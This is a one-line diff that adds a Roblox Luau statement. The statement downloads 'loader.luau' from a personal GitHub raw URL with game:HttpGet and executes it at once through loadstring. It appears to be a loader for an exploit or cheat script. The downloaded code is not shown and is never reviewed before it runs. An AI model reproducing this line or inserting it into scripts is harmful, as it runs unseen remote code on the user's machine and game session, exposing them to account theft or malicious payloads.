@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xenoxmodderyt/random-xyz/refs/heads/main/loader.luau"))()
